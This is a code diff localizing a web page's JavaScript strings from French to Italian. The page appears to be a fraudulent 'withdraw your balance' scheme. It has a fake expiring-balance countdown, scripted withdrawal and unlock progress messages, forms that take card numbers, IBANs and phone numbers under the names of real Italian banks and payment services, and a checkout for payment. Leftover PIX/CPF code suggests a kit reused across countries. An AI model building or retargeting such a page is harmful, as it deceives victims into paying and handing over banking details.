@@ -158,7 +158,7 @@
     let contador = setInterval(() => {
       if (tempoRestante < 0) {
         clearInterval(contador);
-        textElement.textContent = "VOTRE SOLDE A EXPIRÉ";
+        textElement.textContent = "IL TUO SALDO È SCADUTO";
         return;
       }
       let minutos = Math.floor(tempoRestante / 60);
@@ -189,7 +189,7 @@
       let contador = setInterval(() => {
         if (tempoRestante < 0) {
           clearInterval(contador);
-          labelElement.textContent = "Expiré";
+          labelElement.textContent = "Scaduto";
           minutesElement.textContent = "00";
           secondsElement.textContent = "00";
           return;
@@ -231,7 +231,7 @@
     // Reset UI
     progressBar.style.transition = "none";
     progressBar.style.width = "0%";
-    loadingText.textContent = "Initialisation...";
+    loadingText.textContent = "Inizializzazione...";
     loadingText.style.opacity = "1";
   }
 
@@ -243,10 +243,10 @@
     resetLoader(); // Ensure clean state
 
     const steps = [
-      { text: "Vérification de vos informations", progress: 25 },
-      { text: "Finalisation du retrait", progress: 50 },
-      { text: "Traitement de la transaction", progress: 75 },
-      { text: "Dernières vérifications", progress: 100 },
+      { text: "Verifica dei tuoi dati", progress: 25 },
+      { text: "Finalizzazione del prelievo", progress: 50 },
+      { text: "Elaborazione della transazione", progress: 75 },
+      { text: "Ultime verifiche", progress: 100 },
     ];
     const stepDuration = 3000,
       textFadeDuration = 400,
@@ -291,7 +291,7 @@
         loadingText.style.opacity = 0;
 
         const t3 = setTimeout(() => {
-          loadingText.textContent = "Retrait effectué !";
+          loadingText.textContent = "Prelievo effettuato!";
           loadingText.style.opacity = 1;
         }, textFadeDuration);
         loaderState.timeouts.push(t3);
@@ -331,10 +331,10 @@
     progressBar.style.transition = "width 1.3s ease-in-out";
 
     const texts = [
-      "Vérification des données...",
-      "Connexion au serveur...",
-      "Finalisation du déblocage...",
-      "Presque terminé...",
+      "Verifica dei dati...",
+      "Connessione al server...",
+      "Finalizzazione dello sblocco...",
+      "Quasi completato...",
     ];
 
     // Set initial text immediately
@@ -399,7 +399,7 @@
     newLoadingState.timeouts = [];
 
     if (loadingText) {
-      loadingText.textContent = "Vérification de l’accès...";
+      loadingText.textContent = "Verifica dell’accesso...";
       loadingText.style.opacity = 1;
     }
     if (progressBar) {
@@ -479,7 +479,7 @@
       // O valor já deve estar formatado do input, mas garante formatação se necessário
       let formattedKey = formData.chavePix;
 
-      if (formData.tipoChave === "Numéro fiscal") {
+      if (formData.tipoChave === "Codice fiscale") {
         // Se não estiver formatado, formata
         if (!formattedKey.includes(".") && !formattedKey.includes("-")) {
           const cleanCPF = formattedKey.replace(/\D/g, "");
@@ -490,7 +490,7 @@
               .replace(/(\d{3})(\d{1,2})$/, "$1-$2");
           }
         }
-      } else if (formData.tipoChave === "Mobile") {
+      } else if (formData.tipoChave === "Cellulare") {
         // Formata celular se necessário (opcional, geralmente já vem formatado)
         const cleanPhone = formattedKey.replace(/\D/g, "");
         if (
@@ -858,10 +858,10 @@
 
         // Mapeamento de Texto -> ID do Radio
         const typeToId = {
-          CPF: "key-cpf",
-          "Adresse e-mail": "key-email",
-          Celular: "key-celular",
-          "Clé aléatoire": "key-aleatoria",
+          "Codice fiscale": "key-cpf",
+          "Indirizzo e-mail": "key-email",
+          Cellulare: "key-celular",
+          "Chiave casuale": "key-aleatoria",
         };
 
         const radioId = typeToId[currentType];
@@ -874,52 +874,59 @@
 
     // Configura o modal #five conforme o método (Bizum / Banco / PayPal)
     if (modalId === "five") {
-      const method = opener.getAttribute("data-method") || "bizum";
+      const method = opener.getAttribute("data-method") || "postepay";
       const config = {
-        bizum: {
-          title: "Associer ma carte bancaire",
-          icon: "images/cb-logo.png",
-          label: "Numéro de carte",
+        postepay: {
+          title: "Collega PostePay",
+          icon: "images/postepay-logo.png",
+          label: "Numero di carta",
           placeholder: "0000 0000 0000 0000",
           type: "text",
         },
-        banco: {
-          title: "Associer un virement SEPA",
-          icon: "images/sepa-logo.png",
+        intesa: {
+          title: "Collega Intesa Sanpaolo",
+          icon: "images/intesa-logo.png",
           label: "IBAN",
-          placeholder: "FR76 0000 0000 0000 0000 0000 000",
+          placeholder: "IT60 X054 2811 1010 0000 0123 456",
           type: "text",
         },
-        paypal: {
-          title: "Associer PayPal",
-          icon: "images/paypal-logo.jpg",
-          label: "E-mail PayPal",
-          placeholder: "vous@email.com",
-          type: "email",
+        unicredit: {
+          title: "Collega UniCredit",
+          icon: "images/unicredit-logo.png",
+          label: "IBAN",
+          placeholder: "IT60 X054 2811 1010 0000 0123 456",
+          type: "text",
+        },
+        bancobpm: {
+          title: "Collega Banco BPM",
+          icon: "images/bancobpm-logo.png",
+          label: "IBAN",
+          placeholder: "IT60 X054 2811 1010 0000 0123 456",
+          type: "text",
+        },
+        bper: {
+          title: "Collega BPER Banca",
+          icon: "images/bper-logo.png",
+          label: "IBAN",
+          placeholder: "IT60 X054 2811 1010 0000 0123 456",
+          type: "text",
         },
         revolut: {
-          title: "Associer Revolut",
-          icon: "images/revolut-logo.jpg",
-          label: "Numéro de téléphone",
-          placeholder: "+33 6 12 34 56 78",
+          title: "Collega Revolut",
+          icon: "images/revolut-logo.png",
+          label: "Numero di telefono",
+          placeholder: "+39 333 123 4567",
           type: "tel",
         },
-        "sepa-instant": {
-          title: "Associer un virement SEPA instantané",
-          icon: "images/sepa-instant-logo.png",
-          label: "IBAN",
-          placeholder: "FR76 0000 0000 0000 0000 0000 000",
-          type: "text",
-        },
-        wero: {
-          title: "Associer Wero",
-          icon: "images/wero-logo.png",
-          label: "Numéro de téléphone",
-          placeholder: "+33 6 12 34 56 78",
-          type: "tel",
+        paypal: {
+          title: "Collega PayPal",
+          icon: "images/paypal-logo.png",
+          label: "E-mail PayPal",
+          placeholder: "tuonome@email.com",
+          type: "email",
         },
       };
-      const cfg = config[method] || config.bizum;
+      const cfg = config[method] || config.postepay;
       const titleEl = document.getElementById("vincular-title");
       const iconEl = document.getElementById("vincular-icon");
       const labelEl = document.getElementById("metodo-label");
@@ -1072,7 +1079,7 @@
     const optionTextEl = optionRow.querySelector(".option-text");
     const selectedType = optionTextEl
       ? optionTextEl.textContent.trim()
-      : "Chave";
+      : "Chiave";
 
     // Atualiza o texto do seletor na tela #five
     const selectorText = document.getElementById("pix-selector-text");
@@ -1206,7 +1213,7 @@
   function formatPixKey(value, type) {
     if (!value) return "";
 
-    if (type === "Numéro fiscal") {
+    if (type === "Codice fiscale") {
       value = value.replace(/\D/g, ""); // Remove tudo que não é dígito
       if (value.length > 11) value = value.slice(0, 11); // Limita a 11 dígitos
 
@@ -1217,7 +1224,7 @@
         .replace(/(\d{3})(\d{1,2})$/, "$1-$2");
     }
 
-    if (type === "Mobile") {
+    if (type === "Cellulare") {
       value = value.replace(/\D/g, ""); // Remove tudo que não é dígito
       if (value.length > 11) value = value.slice(0, 11); // Limita a 11 dígitos
 
@@ -1233,7 +1240,7 @@
       }
     }
 
-    if (type === "Clé aléatoire") {
+    if (type === "Chiave casuale") {
       // Remove tudo que não é hex
       value = value.replace(/[^0-9a-fA-F]/g, "");
       if (value.length > 32) value = value.slice(0, 32); // Limita a 32 chars hex
@@ -1284,7 +1291,7 @@
 (function () {
   // --- helper: formata número como moeda BRL ---
   function formatBRL(value) {
-    return new Intl.NumberFormat("fr-FR", {
+    return new Intl.NumberFormat("it-IT", {
       style: "currency",
       currency: "EUR",
     }).format(value);
@@ -1477,7 +1484,7 @@
   let threeAnimated = false;
 
   function formatBRL(value) {
-    return value.toLocaleString("fr-FR", {
+    return value.toLocaleString("it-IT", {
       style: "currency",
       currency: "EUR",
     });
@@ -1566,7 +1573,7 @@
   const SEL = "#three .valor-currency-dois[data-amount-target]";
 
   function formatBRL(value) {
-    return value.toLocaleString("fr-FR", {
+    return value.toLocaleString("it-IT", {
       style: "currency",
       currency: "EUR",
     });
@@ -1684,7 +1691,7 @@ document.addEventListener("DOMContentLoaded", function () {
       var existing = document.querySelector("script[data-cooud-elements]");
       if (existing) {
         existing.addEventListener("load", function () { resolve(window.__CooudElements__); });
-        existing.addEventListener("error", function () { reject(new Error("Impossible de charger le module de paiement.")); });
+        existing.addEventListener("error", function () { reject(new Error("Impossibile caricare il modulo di pagamento.")); });
         return;
       }
       var script = document.createElement("script");
@@ -1692,10 +1699,10 @@ document.addEventListener("DOMContentLoaded", function () {
       script.async = true;
       script.dataset.cooudElements = "true";
       script.onload = function () {
-        if (!window.__CooudElements__) return reject(new Error("Le module de paiement ne s’est pas initialisé."));
+        if (!window.__CooudElements__) return reject(new Error("Il modulo di pagamento non si è inizializzato."));
         resolve(window.__CooudElements__);
       };
-      script.onerror = function () { reject(new Error("Impossible de charger le module de paiement.")); };
+      script.onerror = function () { reject(new Error("Impossibile caricare il modulo di pagamento.")); };
       document.head.appendChild(script);
     });
   }
@@ -1718,7 +1725,7 @@ document.addEventListener("DOMContentLoaded", function () {
     var container = document.getElementById("cooud-payment");
     if (!container) return;
     var email = buyerEmail();
-    if (!email) { showPayError("Nous n’avons pas trouvé votre e-mail. Revenez en arrière pour le renseigner."); return; }
+    if (!email) { showPayError("Non abbiamo trovato la tua e-mail. Torna indietro per inserirla."); return; }
     cooudStarted = true;
     showPayError("");
 
@@ -1732,12 +1739,12 @@ document.addEventListener("DOMContentLoaded", function () {
         return response.text().then(function (raw) {
           var data;
           try { data = JSON.parse(raw); } catch (e) {
-            throw new Error("Le serveur a renvoyé une réponse invalide (HTTP " + response.status + "). Veuillez réessayer dans quelques instants.");
+            throw new Error("Il server ha restituito una risposta non valida (HTTP " + response.status + "). Riprova tra qualche istante.");
           }
           if (!response.ok) {
             var detail = data.details && data.details.message;
             var requestId = data.requestId ? " · request_id: " + data.requestId : "";
-            throw new Error((detail || data.message || "Impossible de créer la session de paiement.") + requestId);
+            throw new Error((detail || data.message || "Impossibile creare la sessione di pagamento.") + requestId);
           }
           return data;
         });
@@ -1758,7 +1765,7 @@ document.addEventListener("DOMContentLoaded", function () {
           window.location.assign("/up1?checkout_session_id=" + encodeURIComponent(config.sessionId) + "&productId=" + encodeURIComponent(PRODUCT_ID) + "&redirect_status=succeeded");
         },
         onError: function (error) {
-          showPayError((error && error.message ? error.message : "Le paiement n’a pas pu être traité.") + (error && error.code ? " (" + error.code + ")" : ""));
+          showPayError((error && error.message ? error.message : "Impossibile elaborare il pagamento.") + (error && error.code ? " (" + error.code + ")" : ""));
         }
       });
       try {
@@ -1767,7 +1774,7 @@ document.addEventListener("DOMContentLoaded", function () {
     }).catch(function (error) {
       cooudStarted = false;
       console.error("[Cooud v2] checkout bootstrap failed", error);
-      showPayError(error && error.message ? error.message : "Impossible de charger le paiement.");
+      showPayError(error && error.message ? error.message : "Impossibile caricare il pagamento.");
     });
   }
 
